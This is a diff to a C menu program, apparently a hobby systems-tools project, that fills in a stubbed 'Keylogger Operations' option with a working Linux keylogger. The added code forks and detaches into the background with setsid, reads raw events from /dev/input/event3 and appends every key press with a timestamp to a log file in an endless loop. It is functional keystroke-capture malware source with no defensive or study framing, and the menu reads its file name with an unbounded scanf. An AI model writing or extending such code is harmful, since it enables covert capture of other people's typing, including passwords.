@@ -1,5 +1,13 @@
 #include<stdio.h>
 #include<stdlib.h>
+#include <string.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <linux/input.h>
+#include <time.h>
+
+// Keylogger function declaration
+void keylogger(const char *logfile);
 
 void file_operations_menu();
 void directory_operations_menu();
@@ -128,10 +136,66 @@ printf(" Invalid choice! PLease try again.\n");
 }
 }
 
-void keylogger_operations_menu() 
-{
-printf("n=== Keylogger Operations ===\n");
-printf(" Selected: Keylogger Operations\n");
-printf(" Feature not yet implemented.\n");
+// Keylogger menu function
+void keylogger_operations_menu() {
+    char logfile[256];
+    printf("\n=== Keylogger Operations ===\n");
+    printf("Enter the log file name (e.g., keylog.txt): ");
+    scanf("%s", logfile);
+
+    printf("Starting keylogger... Log file: %s\n", logfile);
+    keylogger(logfile);  // Call the keylogger function
+}
+
+// Keylogger function implementation
+void keylogger(const char *logfile) {
+    const char *device = "/dev/input/event3";  // Replace with the correct event file
+    struct input_event event;
+
+    // Fork the process to run in the background
+    pid_t pid = fork();
+    if (pid < 0) {
+        perror("Error forking process");
+        return;
+    }
+    if (pid > 0) {
+        // Parent process exits, allowing child to run in background
+        printf("Keylogger running in the background. PID: %d\n", pid);
+        return;
+    }
+
+    // Child process (daemon)
+    setsid();  // Create a new session
+    int fd = open(device, O_RDONLY);
+    if (fd == -1) {
+        perror("Error opening device file");
+        printf("Ensure you have the correct permissions or run as root.\n");
+        exit(EXIT_FAILURE);
+    }
+
+    FILE *log = fopen(logfile, "a");
+    if (!log) {
+        perror("Error opening log file");
+        close(fd);
+        exit(EXIT_FAILURE);
+    }
+
+    // Add a timestamp at the start of the session
+    time_t now = time(NULL);
+    fprintf(log, "Session started: %s\n", ctime(&now));
+    fflush(log);
+
+    // Continuously read keystrokes and log them
+    while (1) {
+        if (read(fd, &event, sizeof(struct input_event)) > 0) {
+            if (event.type == EV_KEY && event.value == 1) { // Key press event
+                fprintf(log, "Key %d pressed at %ld\n", event.code, time(NULL));
+                fflush(log);  // Ensure data is written immediately
+            }
+        }
+    }
+
+    fclose(log);
+    close(fd);
 }
 
